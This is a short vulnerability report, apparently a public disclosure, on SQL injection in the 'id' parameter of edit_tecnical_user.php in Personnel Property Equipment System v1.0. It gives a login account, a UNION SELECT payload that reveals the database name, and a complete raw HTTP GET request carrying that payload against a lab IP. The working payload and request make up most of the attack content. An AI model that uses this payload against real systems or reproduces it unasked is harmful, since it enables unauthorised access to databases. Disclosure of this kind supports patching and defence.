# Personnel Property Equipment System v1.0 by sourcecodester has SQL injection 2

BUG_Author: Zhang Qi

Login account: Jonremus/admin

vendors: https://www.sourcecodester.com/php/11255/personel-property-equipment-system.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /ppes/admin/edit_tecnical_user.php

Vulnerability location: /ppes/admin/edit_tecnical_user.php?id=, id

dbname = ppes

[+] Payload: /ppes/admin/edit_tecnical_user.php?id=-2%27%20union%20select%201,2,3,database(),5,6--+ // Leak place ---> id

```sql
GET /ppes/admin/edit_tecnical_user.php?id=-2%27%20union%20select%201,2,3,database(),5,6--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=1lo81k0mv3p5cfonn5hopvoht6
Connection: close
```

<img width="1232" height="745" alt="image" src="https://github.com/user-attachments/assets/b0e028f3-d296-460a-8aa9-fb091854c724" />
